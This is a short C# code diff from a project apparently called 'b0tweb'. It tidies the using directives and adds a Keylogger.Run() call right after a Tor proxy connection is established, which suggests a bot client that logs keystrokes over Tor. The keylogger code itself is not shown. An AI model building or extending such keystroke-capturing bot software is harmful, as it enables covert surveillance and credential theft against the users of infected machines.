@@ -1,8 +1,6 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using b0tweb.MessageHandlers;
+﻿using b0tweb.MessageHandlers;
+using System;
+
 
 namespace b0tweb
 {
@@ -23,6 +21,8 @@ namespace b0tweb
 
             TorProxy proxy = new TorProxy();
             proxy.Establish();
+
+            Keylogger.Run();
 
             Console.WriteLine("Connection to Tor successfuly established!");
 
